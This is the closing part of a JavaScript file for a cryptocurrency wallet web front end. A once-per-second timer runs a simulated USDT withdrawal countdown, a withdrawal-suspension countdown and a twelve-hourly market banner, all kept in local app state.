    updateHeader();
    updateBalances();
    updateHoldings();
    updateActivityList();
    showPage(appState.currentPage);
    setInterval(()=>{
        // Withdrawal Processing Countdown
        const now=Date.now();let stateChanged=false;
        if(appState.withdrawal.processingEndTime>now){
            const remaining=appState.withdrawal.processingEndTime-now,remainingTime=formatTime(remaining);
            const procEl=document.getElementById('proc-countdown');if(procEl)procEl.textContent=remainingTime;
            const idx=appState.activities.findIndex(a=>a.status==='Pending'&&a.type==='Withdrawal');
            if(idx!==-1)appState.activities[idx].desc=`Processing Withdrawal. Remaining: ${remainingTime}.`;
            if(remaining<=0){
                appState.withdrawal.processingEndTime=0;
                const amount=appState.withdrawal.currentWithdrawal.amount,network=appState.withdrawal.currentWithdrawal.network,address=appState.withdrawal.currentWithdrawal.address;
                let usdt=appState.balances.holdings.find(h=>h.symbol==='USDT');if(usdt)usdt.balance-=amount;
                appState.balances.totalUSD-=amount;
                appState.activities[idx].desc=`Withdrawal of ${amount.toFixed(2)} USDT to ${address.substring(0,8)} via ${network} successful.`;
                appState.activities[idx].status='Success';
                appState.withdrawal.currentWithdrawal=null;
                stateChanged=true;showModal('Withdrawal Successful',`$${amount.toFixed(2)} withdrawn!`);
            }
        }
        // Withdrawal Suspension Countdown
        if(appState.withdrawal.suspensionEndTime>now){
            const remaining=appState.withdrawal.suspensionEndTime-now,remainingTime=formatTime(remaining);
            const idx=appState.activities.findIndex(a=>a.status==='Failure'&&a.desc.includes('suspension'));
            if(idx!==-1)appState.activities[idx].desc=`Withdrawal suspended. Remaining time: ${remainingTime}.`;
            if(remaining<=0){
                appState.withdrawal.suspensionEndTime=0;
                appState.activities[idx].desc='Withdrawal suspension lifted.';appState.activities[idx].status='Info';stateChanged=true;
            }
        }
        // Daily Market Banner every 12 hr
        const twelveHr=12*60*60*1000;
        if(appState.settings.notificationsOn&&now-appState.settings.lastNotificationTime>twelveHr){
            showMarketBanner();appState.settings.lastNotificationTime=now;stateChanged=true;
        }
        if(stateChanged||appState.currentPage==='home'||appState.currentPage==='accountPage'){saveAndRender();}
        else saveState();
    },1000);
}
window.addEventListener('load',boot);
// ========== END MAIN JS ============